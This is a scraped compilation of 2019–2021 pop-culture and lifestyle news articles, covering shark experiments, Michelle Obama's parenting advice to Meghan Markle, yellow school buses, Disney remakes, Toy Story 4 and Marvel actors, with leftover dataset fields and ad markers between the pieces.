While the cow's blood didn't attract much to begin with, there were more than 40 by the end of the study.

There was a mild reaction to the fish oil and the urine and seawater attracted nothing.

Advert 10

So then it was onto the next test, which was to see whether sharks had a particular affinity for human blood. Again, there were control surfboards employed for the study, one that deployed one drop of blood per minute, one that would espouse one drop every four seconds and one that had nothing.

Interestingly, researchers found that no sharks were attracted to any of the surfboards.

""I think it's safe to qualitatively say that if no sharks came to check out 15 drops of human blood a minute in the middle of shark-infested waters, you're probably going to be okay with a small scrape,"" Rober revealed.

Advert 10

""There certainly won't be some kind of feeding frenzy with a single drop of blood from all sharks within a mile.""

That should certainly help loads of people relax about going into the ocean with a small scratch because, let's be honest, we've all thought about it at one point or another.

Advert 10

But that's not to say that sharks aren't ferocious predators.

That's what a group of blokes discovered as they were on a fishing trip in America.

The men were fishing about 30 miles off the coast of Manasquan Inlet, New Jersey, when they were paid a visit by a massive shark, more than half the size of their boat.

Advert 10

In a video taken from the boat, the grey figure can be seen lurking ominously below the water, edging closer and closer.

As the calm among the fishermen rapidly evaporates, the shark then surges above the water and rips the bait from the vessel, Jaws-style.",YouTuber Tests If Sharks Can Actually Smell A Drop Of Blood From A Mile Away,

The Grand Tour host revealed he “nearly had a heart attack” when he spotted a red stain around the toilet bowl after going to the bathroom.

Michelle Obama Just Gave Meghan Markle Advice on Being a New Mom — and It Left Her 'Speechless'

When it comes to motherhood, former First Lady Michelle Obama has one piece of advice for Meghan Markle: “Savour it all.”

Meghan, who welcomed son Archie Harrison in May, said she was left “somewhat speechless” when the questions she sent Obama to answer for the back page of British Vogue‘s September issue (which Meghan guest-edited!) were returned “as a thoughtful, reflective and beautifully curated narrative – a gentle reminder not of how but of why she has become such a globally respected public figure.”

Meghan revealed that the two women discussed the project “over a casual lunch of chicken tacos and my ever-burgeoning bump.” And the final result includes a lot of compelling parenting advice for the new royal mom.

“Being a mother has been a masterclass in letting go,” Obama wrote in response to Meghan’s question about what motherhood has taught her. “Try as we might, there’s only so much we can control. And, boy, have I tried — especially at first. As mothers, we just don’t want anything or anyone to hurt our babies. But life has other plans. Bruised knees, bumpy roads and broken hearts are part of the deal.”

The former first lady goes on to explain the differences in her two daughters, 21-year-old Malia and 18-year-old Sasha.

“Motherhood has taught me that, most of the time, my job is to give them the space to explore and develop into the people they want to be. Not who I want them to be or who I wish I was at that age, but who they are, deep inside,” she said. “Motherhood has also taught me that my job is not to bulldoze a path for them in an effort to eliminate all possible adversity. But instead, I need to be a safe and consistent place for them to land when they inevitably fail; and to show them, again and again, how to get up on their own.”

Obama also reflected on what it was like to be a parent to infants, the phase that Meghan and Prince Harry find themselves in now with their nearly 3-month-old son.

“When Malia and Sasha were newborns, Barack and I could lose hours just watching them sleep. We loved to listen to the little sounds they’d make — especially the way they cooed when they were deep into dreaming,” she said. “Don’t get me wrong, early parenthood is exhausting. I’m sure you know a thing or two about that these days. But there is something so magical about having a baby in the house. Time expands and contracts; each moment holds its own little eternity.”

Obama continued, “I’m so excited for you and Harry to experience that, Meghan. Savour it all.”

Meghan, 37, was a hands-on collaborator for the edition, from selecting the cover stars and interviews to choosing the photographer.

Editor-in-chief Edward Enninful revealed that he and Meghan both chose famed photographer Peter Lindbergh as the artist behind the camera for the cover shoot.

“My instructions from the Duchess were clear: ‘I want to see freckles!’ ” Lindbergh told the publication when he recalled the phone conversation he had with Meghan on the morning of the New York shoot.",Meghan Markle Receives New Mom Advice from Michelle Obama,

The brutal Brit is never too far from the headlines because of his unapologetic ways of dealing with people.

I say “unapologetic”, when what I really mean is that he’s a bit of a d**k to people, who don’t deserve it most of the time.

And this incident is no different. Recently, he’s been absolutely blasted for his “cruel stunt” on his new TV show. Some people think it’s funny, but others have taken offense to his way of experiencing local delicacies. Is this meant to be a middle finger to the vegans or are they just taking it a little close to heart? Have a look and see what you think!

Here’s Why School Buses Are Always Yellow

Admit it, you've always wondered! The post Here’s Why School Buses Are...
",26/07/2019 11:17,https://www.rd.com/article/why-school-buses-are-always-yellow/,"Admit it, you've always wondered!

Back in April 1939 and armed with a $5,000 grant supplied by the Rockefeller Foundation, Columbia University Teachers College professor Frank Cyr took a tour of ten states to gauge the extent of school transportation issues. What he found proved that student transportation was in a sorry state—many students had no dependable way to get to school and the ones who did often traveled in unsafe, unstandardized buses in the over 100,000 school districts that existed back then (in contrast to the roughly 13,000 that exist today). One of the huge variations in school transportation that he saw? Bus color, which leads us to ask, why are school buses yellow now?

How did school buses become yellow?

Seeing a need to fix this system, Cyr organized a conference—one that would change the future of school buses forever. School officials and transportation specialists convened to set much-needed standards for buses, including those for color, height, and width as well as safety rules that hadn’t previously been set or that varied by state. Another thing that also went through a much-needed standardization? Stop signs—they used to be yellow, and much more recently than you think.

Why are school buses yellow?

There were many different bus colors in the United States before this conference; several districts even planned to have red, white, and blue buses as a way of promoting patriotism among students. Cyr presented his new options to education officials, a reported “50 shades ranging from lemon yellow to deep orange-red.” The matter was settled quickly. Yellow, or “National School Bus Glossy Yellow,” as it is officially called by the National Highway Traffic Safety Administration, was chosen for its high visibility and the way it emphasized the bold, black writing that would be on the side of each bus to denote its respective school district. This yellow color is an important factor for vehicles that travel during early morning and late afternoon hours. Color has always been important to our daily routine—check out the reason our traffic lights are red, yellow, and green. Thirty-five states made the changes promptly, and every state was on board by 1974.

Dubbed the “father of the yellow school bus,” Frank Cyr’s legacy has definitely affected your life if you ever rode a school bus or saw that familiar hue pulling up to your stop on a dusky morning. Now, find out the 12 things your child’s school bus driver wishes you knew.",Here’s Why School Buses Are Always Yellow,

However, hold your horses, as it turns out Marvel's flick isn't really the biggest blockbuster in history – at least, if you take inflation into account.

The honour instead goes to 1939 classic Gone with the Wind, which adjusted for inflation would have taken $3.44 billion at today's ticket prices, well ahead of Endgame's $2.79 billion, according to the Guinness Book of World Records.

MGM

In fact, Avengers: Endgame is the 16th biggest movie of all time when ticket price inflation is taken into account, behind the likes of Star Wars: The Force Awakens, ET: The Extra-Terrestrial and Avatar (via Box Office Mojo).

Still, at least Endgame is more fitting with the times, especially as Gone with the Wind hasn't exactly dated well – notably in terms of its portrayal of race relations.

Following on from the Marvel flick's big box office record, Avatar director James Cameron congratulated the movie on its success, saying in a statement: ""I see you, Marvel. Congratulations to Avengers Endgame on becoming the new box-office king. Jim Cameron.""

In an interview with Radio 1 Newsbeat, writer Stephanie Gillis explained how they are constantly looking to the future in that they have to try and ‘guess’ what will happen in the world months in advance.

Stephanie said:

We are sort of futurologists in that we write 10 months ahead, so we’re trying to guess what is going to happen.

Because of this, it’s more than likely they are going to hit the jackpot and make correct predictions at least some of the time – especially when they consult things that have already happened to inform their decisions.

Take, for example, the Donald Trump prediction: another of the show’s writers, Al Jean, explained how they were ‘looking for a funny celebrity who would be president’ way back when in 2000 – and Trump had already said he’d consider running for office in the future.

The writer, who has been with Homer and the crew since the show began in 1989, went on to say:

If you make enough predictions then 10 per cent will turn out to be right.

Jean also explained how an episode which aired long before the September 11, 2001 terror attacks – which provided a field day for conspiracy theorists when it appeared to predict 9/11 – was simply a massive coincidence.

In the episode, the family head to New York City and buy a guide book which has the words ‘9 dollars’ on it next to a picture of the Twin Towers and ultimately looked like 9/11. However, Jean said that was ‘totally coincidental’.

The predictions don’t stop there though; the show has also been known to predict Lady Gaga’s Super Bowl performance, the Game Of Thrones Battle Of King’s Landing, Disney’s takeover of Fox, and Canada’s legalisation of marijuana – to name just a few.

I tell you what, as impressive as getting a gig on The Simpsons is, those writers should be adding ‘fortune teller’ and/or ‘predictor of the future’ to the top of their CVs.

What Could Happen If You Don't Put Your Phone on Airplane
Mode During Flights

There are really good reasons for keeping your phone on airplane mode, but they are probably not what you think

April 17, 2021

What happens if you don't put your cell phone into airplane mode when flying? Most people obey the order to disconnect. Others do not, yet the plane still lands safely. You may have even been guilty of turning off cellular data mistakenly believing that you're in airplane mode. But if planes aren't crashing because of phones, why should you put your phone into airplane mode during your next flight?

Does a Cell Phone Interfere with a plane's navigation?

Some people believe that a cell phone interferes with the equipment on a plane primarily responsible for navigation. But it's never been proven that this is the case. Systems on aircraft are crafted to some pretty high standards and are shielded to prevent outside interference. Still, just because a phone hasn't been responsible for causing interference doesn't mean it's not possible.

The National Transportation Safety Board has never issued a recommendation about personal electronic devices on planes. In fact, there is no documented case in which electromagnetic interference from a portable electronic device contributed to a plane crash. Electromagnetic interference risks are very low, but the consequences are quite high.

Will The Plane Crash?

Your phone is not necessarily going to cause the plane to crash. But you will annoy the pilots and air traffic controllers. And that annoyance could be enough to distract them. On the ground, cell phones operate at a fairly low power. However, as you get further from a cell phone tower, the power of your phone must increase in order to communicate effectively. This power can be magnitudes higher than a simple WiFi or Bluetooth signal. As you get higher from the ground, you get higher from the cell phone towers. So, your phone increases power accordingly.

Unpleasant Noise

This increase in power causes radio emissions that can make a very unpleasant noise through the audio system that the pilots and air traffic controllers can hear. Obviously, if there is just one person on the plane inconsiderate enough to leave a cell phone turned on, it's probably not enough to cause too much of a disturbance. However, the more people who have cell phones transmitting signals the more feedback noise and distraction is present for the pilots. That distraction could be enough to cause a problem in flight. You really don't want your pilot distracted.

What About Carriers that Allow In-Flight Calls?

Some carriers have in-flight cellular service. In this case, there is a cell station inside the plane that communicates directly to the ground. Cell phones on board communicate directly with the cell station at a very low power, causing no issues. So, if you accidentally forget to turn your phone into airplane mode, it's not that big of a deal. But you should follow this simple order, as you are helping those professionals on your plane to get you where you need to go as safely as possible.

What is the take home message?

Even though a cell phone signal probably won't directly cause a plane crash, you should still do your part. So do everyone a favor; just put your phone to airplane mode and turn off anything you don't need to have on. Your pilots, who are responsible for getting you to your destination safely, will thank you.",What Really Happens With the Plane if You Don't Set Your Phone to Airplane Mode When Flying?,

Turns Out There's An Animal That Great White Sharks Are
Absolutely Terrified Of

",22/07/2019 12:13,https://www.iflscience.com/plants-and-animals/white-sharks-are-terrified-of-killer-whales-study-says/,"Great white sharks are all bark and, well, maybe a little less bite than previously believed – at least when it comes to the ocean’s mafia.

According to new research published in Scientific Reports, white sharks off the coast of Northern California high-tail it whenever orcas show up. Even better? They’ve been documented avoiding that area for up to a year later.

""These are huge white sharks. Some are over 18 feet long (5.5 meters), and they usually rule the roost here,"" said scientist Scot Anderson in a statement, adding that his team has been observing some of these sharks for the last two decades.

Every September and December, white sharks migrate to the Farallon Islands to hunt young elephant seals for over a month at a time. Orcas, who also feed off the seals, only occasionally join the party. But as soon as they show up, white sharks leave the area within just a few minutes.

""When confronted by orcas, white sharks will immediately vacate their preferred hunting ground and will not return for up to a year, even though the orcas are only passing through,"" said Dr Salvador Jorgensen, a senior research scientist at Monterey Bay Aquarium and lead author of the study.

The findings challenge the idea that white sharks are the most voracious predators in the ocean, and shows us that even the giant hunters can become the hunted. When such events happen, the entire food web is impacted. In this case, elephant seal populations experience four to seven times fewer predation events when the sharks are gone.

Researchers analyzed four encounters between white sharks and orcas in the Greater Farallones National Marine Sanctuary off the coast of San Francisco, California. They also looked at data from 165 tagged white sharks between 2006 and 2013 and compared their migration patterns against field observations of orca sightings in the area compiled over 27 years. They found that even brief visits from killer whales made white sharks leave the area, disrupting their feeding patterns for an extended period of time. The sharks preferred to crowd together at other elephant seal colonies farther along the coast or head offshore rather than stay in the vicinity of orcas.

Interactions between apex such as these are important, albeit not well-documented.

""We don't typically think about how fear and risk aversion might play a role in shaping where large predators hunt and how that influences ocean ecosystems,"" Jorgensen said. ""It turns out these risk effects are very strong even for large predators like white sharks – strong enough to redirect their hunting activity to less preferred but safer areas.""

Researchers say they aren’t sure if the orcas are targeting white sharks as prey (they’ve been known to do as much) or if they’re simply bullying competition to get after their preferred meal choice. Regardless, it adds insight into how feeding behaviors influence marine ecosystems.

""I think this demonstrates how food chains are not always linear,"" Jorgensen said. ""So-called lateral interactions between top predators are fairly well known on land but are much harder to document in the ocean. And because this one happens so infrequently; it may take us a while longer to fully understand the dynamics.""",Study Reveals What Great White Sharks Are Afraid Of,

These are the 10 most obese states in the US

Consumer Protect recently analyzed data from the Centers for Disease Control and Prevention (CDC) to determine the most unhealthy states in the US.

According to the organization, West Virginia — followed closely by Mississippi and Oklahoma — is the most obese in the US, with roughly 38 percent of adults in the state struggling with obesity as of 2017.

By contrast, Colorado was determined by Consumer Protect to be the least obese state in the nation, with roughly 22.6 percent of adults in the state being obese as of the same year.

America has long dealt with the issue of obesity. The condition affected 93.3 million adults in the country from 2015 to 2016, per the CDC.

“In 1990, obese adults made up less than 15 percent of the population in most US states. By 2010, 36 states had obesity rates of 25 percent or higher, and 12 of those had obesity rates of 30 percent or higher,” according to Harvard University’s School of Public Health.

“While US obesity rates have, overall, stayed steady since 2003, the rates are still rising in some groups, and disparities persist: Non-Hispanic black, Hispanic, and Mexican American adults have higher rates of obesity than non-Hispanic white adults,” the school added.

Mississippi (37.3 percent) and Oklahoma (36.5 percent) claimed the No. 2 and No. 3 spots on Consumer Protect’s list in terms of percentage of obese adults in the area.

Consumer Protect also looked at states where adults engaged “in zero physical leisure activity,” which they dubbed the “Couch Potato Index.”

Kentucky was No. 1, with 34.4 percent of adults in the state engaging in zero physical activity. Mississippi and Arkansas followed behind with 33.2 percent and 32.5 percent, respectively.

There are many obesity-related health conditions, namely heart disease, type 2 diabetes, some types of cancer and stroke, among other health ailments, according to the CDC.

Here’s a look at the 10 most obese states in the US and the percentage of obese adults living in that location, per Consumer Protect.

West Virginia (38.1 percent) Mississippi (37.3 percent) Oklahoma (36.5 percent) Iowa (36.4 percent) Alabama (36.3 percent) Louisiana (36.2 percent) Arkansas (35 percent) Kentucky (34.3 percent) Alaska (34.2 percent) South Carolina (34.1 percent)

New York comes in at number 45 on the list, with 25.7 percent of adults in the state being classified as obese, according to CDC data.","These are the 10 most obese states in the US, based on CDC data",

If you have access to a 401(k) plan through your employer, that can be an easy way to start socking money away.

You'll likely need more money than you think. By 50, you should aim to have at least six times your salary saved for retirement in order to be on track to retire at 67, according to calculations from retirement-plan provider Fidelity.

If you earn $50,000 a year, you shoud aim to have $300,000 put away by 50. If your current salary is $100,000, you should aim for $600,000 in retirement savings.

But how much do Americans actually have saved? As of the fourth quarter of 2020, Americans between the ages of 50 and 59 have an average 401(k) balance of $203,600, according to data from Fidelity's retirement platform. Employees in this age group contribute an average rate of 10.4% of their salaries.

Taking advantage of an employer match is an easy way to boost savings. The average employer contribution for 50-year-old Americans is 4.8%. By contributing just over 10% of your salary, you would be adding a total of 15% of your salary to your 401(k) each year.

Saving money for retirement can be hard, especially if you are behind or cannot save much. But even contributing 1% of your salary to retirement savings to start and slowly increasing that contribution can make a big difference over time.",Here's how much Americans in their 50s have in their 401(k)s,

Revealed: the three-word question consuming the world’s
biggest brains | Tom Clark

",20/07/2019 12:17,https://www.theguardian.com/commentisfree/2019/jul/17/three-word-question-world-biggest-brains-survey-intellectuals,"What is preoccupying the world’s leading minds? It is an audacious question for sure. Some might say leading physicists will be concentrating on physics, leading philosophers on philosophy, historians on history and so on.

And yet when we look back on different eras, we can sometimes spot a thread – the preoccupation with truth in ancient Athens, with beauty in Renaissance Europe, with political “reason” during the Enlightenment, with scientific progress during the industrial age. There is, I believe, likewise a new preoccupation lurking in the biggest brains of our time, and that theme is summed up in one word – identity.

What possible basis could I have for making what may, I realise, sound like a wild claim? Well, in a know-nothing political age Prospect, the magazine I edit, felt it would be timely to salute intellectual effort by this week publishing a list of 50 top thinkers. They have been picked on the basis of fruitfully engaging with the problems of our times, giving weight to originality, impact and communication. We have consulted closely with global authorities on economics, history and science about their peers, and considered the books and ideas we can see making waves. The biggest of these waves – by far – are those concerning identity.

That’s not the only change since the magazine produced its first global hit parade in 2005. Some differences are stark. For example, whereas in 2005 there were 90 men and just 10 women, today the gender mix is essentially 50-50. And certain subjects have gained prominence exactly as you’d expect: climate science and especially tech.

There are other changes, too, that you’d expect. In economics, the brightest minds are asking newly disruptive questions. Dani Rodrik is included for his erudite exploration of why the promise of globalisation has disappointed so many, as well as Anne Case and Angus Deaton for elucidating the human toll of American capitalism. Economic historian Adam Tooze features for exposing the limitations of nation-based macroeconomics, as does Hyun-Song Shin of the Bank for International Settlements for starting to sketch the alternative of a border-straddling macro-financial perspective.

All interesting stuff, but a natural response to the crash. The bit I didn’t see coming is how many big minds would be consumed by variants of a single question: who are we? By my reckoning it is around half. What exactly, disparate thinkers are asking, does it mean to be American, Muslim, Indian, female, black or simply human?

Starting with that last and most general question of identity, primatologist Frans de Waal has lit up the human condition by living with apes, and the fast-rising philosophical star Amia Srinivasan has written brilliantly on octupuses and termites, noting how often people have looked at insects and “seen themselves”. There’s room, too, for geneticist Robert Plomin, who believes modern science has done for the idea of the blank slate, but refuses to lapse into genetic determinism, and instead focuses on how society can even out the odds for people with different DNA.

As it happens, the first three names on the list – and they are just alphabetical for now, with a public vote to pick the top 10 open – are all wrestling with identity. Naomi Alderman’s novel Disobedience, about a London rabbi’s bisexual daughter, explores how faith communities can find space for difference; Syrian architect Marwa al-Sabouni explains how deadly walls of misunderstanding in Syria grew up due to a dearth of public spaces; philosopher Kwame Anthony Appiah reconciles the importance of grounded identities with the need to protect vulnerable groups.

That last need is made all the more pressing by the cheerleader for racism in the White House. A rare journalist on the list is Ta-Nehisi Coates, in the summer the argument of his influential Atlantic essay The Case for Reparations finally reached Congress. Ghanaian-born, US-based novelist Yaa Gyasi is here for Homecoming, which makes sense of modern America by tracing its story forward from the nation’s original sin of slavery. Back in Europe, Cas Mudde makes the grade as the pre-eminent scholar of the identity-based populist backlash. Closer to home, David Olusoga features because of writing and broadcasting that forces Britain to rethink a troubling imperial past.

Religious, racial and national identities have come to the forefront of thinking during war or dictatorships

Coming from a very different perspective is JD Vance, a conservative venture capitalist from the wrong side of the tracks. His memoir Hillbilly Elegy sympathetically locates the roots of the rage of the US’s white working class to grim conditions like those he grew up in. Then there is social psychologist Jonathan Haidt, who riles leftwing campus activists by pointing to evidence about how feelings can lead you astray, and urges them to clamber out of deep culture-war trenches.

The work of many of our other top thinkers – critic Sarah Churchwell, psychoanalytic scholar Jacqueline Rose, novelist Arundhati Roy and philosopher Kate Manne – all engage with gender or national identities. The precedents are not happy: religious, racial and national identities have come to the forefront of thinking during war, strife or dictatorships. Until recently, they wouldn’t have loomed so large on any plausible list of top thinkers drawn up in the west.

It may be tempting to imagine their prominence is due to multiculturalism. But the dates don’t work. Western societies have been growing more diverse for generations, and the sharpened sense of difference has been there since 9/11 at least. What has changed more recently is rampant insecurity, a product of tough economic times and the decline of western nations used to being top dogs. Some are left hankering to take back control, or make their country great again. But in the face of nostalgic chauvinism, the lot of the biggest minds seems to be to turn inwards – and wonder who they really are.",Revealed: the three-word question consuming the world’s biggest brains | Tom Clark,

Firefighters Rescue Litter Of Puppies From A Storm Drain To

A fireman from the Colorado Springs Fire Department was caught on camera pulling out at least eight black-colored pups from a storm drain last Thursday.

Officials at the scene assumed they were newborn black Labrador puppies during the rescue, causing officials to be concerned that it was a case of dog dumping, Fire Captain Brian Vaughan told InsideEdition.com.

Vaughn said the rescue took about 20 minutes, and the litter was relinquished to the Humane Society of the Pikes Peak Region shortly after.

That’s when they discovered the ""puppies"" were actually baby red foxes.

“They took them [to the shelter] and actually one of the vets in that location said, 'No, these aren’t Labradors, these are foxes,” Vaughn said. “[The firefighter] was just in shock.”

He explained their neighborhood is in the foothills of the Rocky Mountains, and foxes are commonplace in the area.

The baby foxes are still being cared for at the Humane Society, and it is unclear what will happen to them when they have been rehabilitated.

When Disney Will Stop Making Live-Action Remakes

The Lion King is on the way. And it won't stop there.
",17/07/2019 12:44,https://www.cinemablend.com/news/2476383/disney-wont-stop-making-live-action-remakes-until-it-stops-making-money,"Another Disney live-action remake is headed to theaters with July's The Lion King, and as many are well aware, there are more live-action projects on the way. ""Why?"" some on the internet may ask. So, why do more remakes of Disney classics keep coming down the pipeline? It seems like a valid question, especially when polarizing castings or various other changes that appear in these remakes tend to stir up all sorts of concerns or even arguing amongst Disney fans.

It's a question that has marked this decade in particular, and has slowly intensified with each passing year following Tim Burton's Alice In Wonderland remake in 2010. Believe it or not, though, there's a reason Disney continues to push these live-action remakes through: the movies make money. Until these remakes stop making money, we are going to continue to see live-action remakes of all the animated Disney classics get produced. Let's take a look at what got us here, how much The Lion King could make and what the future of the live-action projects holds.

Just How Much Money Do These Live-Action Remakes Make?

Since 2010, there have actually been nine live-action Disney movies that were remakes or adaptations of animated classics. While critics may have been middling on most of them, they were all solid commercial successes. In fact, two of them (Alice In Wonderland and Beauty And The Beast) have grossed over a billion dollars. Jon Favreau's previous live-action flick The Jungle Book wasn't far off from that, either, bringing in $966.6 million, and Aladdin is doing pretty well at around $960 million at the time of this writing.

Even the lesser performing live-action Disney adaptations have pulled a respectable profit. Christopher Robin was the lowest with $122.7 million difference between projected budget and box office numbers, but it's worth noting its budget was a quarter of most of the other live-action adaptations of this era -- and it wasn't a straight adaptation, either, like some of the more beloved properties. This may be why it didn't measure up numbers-wise to a majority of the cookie-cutter adaptations like Beauty and the Beast.

Put all of the estimated budgets of these nine films (around $1,118,000,000?) up against the box office pull ($6,366,600,461), and Disney has come out way ahead on these sorts of animated-but-realistic projects. Audiences may say they want something original, but time and time again Disney has put these projects out and they've flopped: think John Carter and particularly Tomorrowland. When looking at the numbers, it isn't hard to see why Disney feels no guilt in giving an audience remakes that look pretty but aren't strictly necessary.

What Happens If The Lion King Flops, Will Live-Action End?

First off, let's just be realistic and say there's a very good chance that The Lion King will not flop. The fact that people are wondering if it will still hit a billion dollars with poor reviews should be evidence enough that this one will be a commercial success even if it ends up sticking with a Rotten score.

With all that in mind, let's say there's a hypothetical boycott in which the entire world (because international box office numbers for these films often nearly double the American box office) boycotts The Lion King and it flops. Sure, Disney might be rattled that people of many nations and backgrounds united on this one issue, but it still has many remakes, sequels and adaptations in the pipeline that ensure this trend keeps on rolling.

That's not to say a few flops wouldn't make Disney re-evaluate that strategy, but if we're wondering if The Lion King will hit a billion dollars despite lukewarm reviews, then I think we're all subconsciously admitting the day people stop turning up for these movies is pretty far off, which means there is certainly appetite for them. Still though, if by some miracle this movie flops, Mulan flops, and the next few that follow flop, then maybe, maybe, Disney will stop re-releasing animated classics in live action.

But Disney Will Eventually Run Out Of Animated Movies To Remake, Right?

To date, Disney has made nine live-action remakes of animated classics, and three adaptations based on the animated classics. There are several others of both types in various stages of development, and scores of many other movies in its vault to consider for future live-action adaptations. Sure, not all of them like Fantasia or The Three Caballeros will probably get made, but there are still plenty of options.

Even then, folks need to realize that any of these live-action adaptations could get another live-action adaptation down the road. The Jungle Book already had a live-action adaptation in 1994, and made more money with a version that was actually less live-action (and is getting a sequel) two decades later. Remakes of remakes are on the table, which means Disney could be going to this fountain long after we're all dead and gone. That's not even getting into all the sequel possibilities out there.

Is this really that bad of a thing though? Disney's live-action remakes may cause some controversy, angst, and destroy the childhood of some grown adults, but box office numbers show a lot of people watch them. Are we to believe the masses are going to the theaters just to hate watch a movie they wish was never made to begin with? Of course not, although one may think that looking at the outrage and comments on some of these movies. Just remember, angry people on social media are often just a minor part of a whole.

So, Disney Likely Won't Quit These Live-Action Remakes

Again, there's an unfathomable scenario where multiple Disney live-action remakes and adaptations flop and the company stops, but the numbers indicate those days are far off into the future. Until folks stop turning up for these movies, there's no chance in hell Disney will ever consider shoveling audiences slightly different but more of the same movies they've already made millions off of.

And really, who can blame Disney? Do people get upset at Vanilla Ice when he shows up to a venue and plays ""Ice Ice Baby,"" instead of a deep cut from his album? No, people want the classics and what they know, and the box office has often shown that's largely true with movies as well.

Are there exceptions? Absolutely, but take one glimpse at the box office success of originals IPs vs. sequels and remakes of established franchises, and it's clear which route studios prefer to go almost every time. it's always going to be worth the complaints from the peanut gallery, until enough disgruntled souls finally put their foot down and say ""enough is enough.""

In particular, there still seems to be enough excitement around these projects that we could be getting more for some time to come, which means the only question left to ask is whether or not the House of Mouse will be able to maintain it's current pace of putting a slew of these out each year. Which means it's up to you to get on board with the new movies, or don't.

Robert Downey Jr. Mindblowing Earnings From Avengers:
Endgame Revealed

",13/07/2019 10:01,https://comicbook.com/marvel/news/avengers-endgame-robert-downey-jr-alternate-final-lines-iron-man/,"✖

After a decade of wholesome family fun, Iron Man star Robert Downey, Jr. joked (we think?) on a podcast appearance this week that Avengers: Endgame almost saw its hero drop an F-bomb for some of his last words. The notion came up as part of a little quiz, where the Hypocondriactor Podcast got him to talk a little bit about those final days as Iron Man, and reveal that the ""I am Iron Man"" not only wasn't the only line considered, but may not have been the scripted line. He attributes it rather vaguely to either one of the editors or one of the writers, which might suggest there was either a different line altogether, or a placeholder line so that it could be discussed with Downey, before they started filming.

It doesn't seem like many of the other lines had much chance of making it in -- and while the idea of dropping an F-bomb on a Mad Titan is a ton of fun, it's likely that never would have happened even if Downey were serious about it. Still, it's interesting to think of an alternate timeline where something else ended up being used in that iconic scene.

""Correct answer is 'I am Iron Man,' but I had so many alt lines that I wanted to put forward,"" Downey answered. ""Oh god, let me think. They were all super smart-ass lines like I was trying to, y'know, dumb stuff like, 'You are so f---ed' or whatever. You know what, I'll have to go back to my notes... I get the Infinity Stones and then have the power to snap and have whatever I wanna have happen--Oh, tha- I was gonna say 'Oh, snap.'""

While we joked about the F-bomb above, it doesn't quite seem like the ""snap"" pun would have landed with the same gravitas as the line he actually delivered. Downey feels the same way, and likes the symmetry of the line that eventually got used.

""[The alternate lines were] too smart-ass, and it was the whole arc of the character,"" Downey said, adding, ""it was, I think… maybe one of our great editors' ideas, or one of the writers to say we need to go right back to the first film, and have his dying words be the words of his origin….We love a bookend.""

That said, if there are dailies where he actually said any of these things, we'd love to see it.

‘Toy Story 4’ Boycotted by Christian Group Over
‘Dangerous’ Lesbian Scene

",12/07/2019 18:08,https://twentytwowords.com/toy-story-4-being-boycotted-because-dangerous-lesbian-scene/,"With every major movie release that comes with equal parts critical acclaim and audience love, there has to be a fly in the ointment, right? But no film has faced this more this year than Toy Story 4. The fourth part of the beloved franchise has received almost universally positive reviews online – but there always has to be someone to spoil the fun, right?

Well, as if often the case, the role of the fun police in this instance had to go to One Million Moms. The online group aren’t known for being uber-tolerant at the best of times – but they’ve taken on a strange opponent in Toy Story 4. Their complaint seems both small-minded and incendiary – and it looks like the internet agrees.

advertisement

It’s strange to think that, before 1995, we lived in a world without Toy Story. The very first Disney and Pixar collaboration came out in that year, and totally turned the world of children’s movies upside down.



advertisement

And since then, we’ve had regular check-ins from the world of the toys. Toy Story 2 followed in 1999, and Toy Story 3 in 2010.



advertisement

Many believed that Toy Story 3 would be the final film. It came out in 2010 and received as much critical acclaim as the two previous smash hit movies.



advertisement

Although it gave us this harrowing scene. Seeing all of our favorite toys almost coming to a fiery, painful end was nearly too much for audiences to bear. Although (spoiler alert) everything turned out fine in the end.



advertisement

via : Shutterstock If Toy Story 3 had ended in tragedy, it seems unlikely that there would be another follow-up. But, this year, the much anticipated fourth installment from the Toy Story universe hit our screens.



advertisement

Toy Story 4 hit theaters on June 21st. It was the first time in nine years that fans had had fresh contact with Woody, Buzz, and their other favorite characters.



advertisement

And one, in particular, truly struck a chord with fans: Forky.



advertisement

It had an almost universal appeal, because older fans of the ’90s movies and newcomers to the franchise could both enjoy the feel-good fun.



advertisement

Forky struck a chord with a lot of listless adolescents. And as a bonus? Parents can get their kids some official Toy Story 4 merch for free!



advertisement

In spite of initial doubts about the movie’s success, it did exceptionally well in the box office, making a smashing $238 million in its opening weekend.



advertisement

This week, one review, in particular, hit the headlines. It comes from well-known internet trolls, One Million Moms.



advertisement

“At the start of the movie, when Woody’s new owner Bonnie goes for her first day of kindergarten, in the background there is a quick scene where one child is dropped off by two moms. Later, the moms return to pick up their child who gives them a hug. The scene is subtle in order to to desensitize children. But it is obvious that the child has two mothers, and they are parenting together. Toy Story 4 is the last place parents would expect their children to be confronted with content regarding sexual orientation. Issues of this nature are being introduced too early and too soon. It is extremely common yet unnecessary.”



advertisement

And there was a high level of suspicion that the scene may not be as big a deal as One Million Moms made out.



advertisement

via : Twitter We have to say, this seems like it would be pretty easy to miss. Plus, the two women are hardly making out on screen. They could even be sisters or friends for all we know – not that it wouldn’t be totally okay if they weren’t.



advertisement

There may be an ulterior motive for the hate that One Million Moms are begetting for this scene – perhaps that these parents are clearly kind and affectionate with their kids?



advertisement

Many think that this (very small) instance of inclusion was undeniably positive and would serve as something incredibly helpful for young people concerned that they are “different.”



advertisement

The scene was so minimal that it was basically “blink and you’ll miss it” – and the fact that so many didn’t even notice the scene proves how not-a-big-deal it was.



advertisement

It does seem kind of unlikely that, had they watched the entire movie, this reviewer would be quite so irate about what amount to a couple of seconds of screentime.



advertisement

This isn’t the first instance of gay co-parenting in Disney movies by a long way – and Simba turned out absolutely fine!



advertisement

Plus, you can hardly expect Toy Story to be too strict in its normative love stories. Once you’ve had a nursery rhyme character share a kiss with an astronaut, you really do start to have to suspend your disbelief about who can and can’t love who. In fact, maybe we could all take a lesson from Toy Story. But this scene isn’t the only one Toy Story has come under (potentially unnecessary) fire for.

Tom Holland Admits He Has A Special Nickname For Robert
Downey Jr.

",6/07/2019 10:47,https://www.cinemablend.com/news/2475944/tom-holland-admits-he-has-a-special-nickname-for-robert-downey-jr,"In the Marvel Cinematic Universe, the characters of Iron Man and Spider-Man have been inseparable. The characters built a bond over the course of several films, so it's not too surprising that actors Robert Downey Jr. and Tom Holland have done the same. The pair have become close, though the fact that Iron Man is now gone from the Marvel Cinematic Universe now means that Tom Holland and Robert Downey Jr. don't get to make movies together anymore.

Spider-Man: Far From Home is the first time that the MCU Spider-Man has made a movie without his buddy Iron Man, but the two clearly still have a strong connection. It turns out Tom Holland even has the perfect nickname for his buddy Robert, as he recently admitted that Downey's phone number in his phone is labeled with more than just a name. According to Holland...

He's The Godfather in my phone. Yeah, he's like, RDJ The Godfather. Yeah, that's what I have him as.

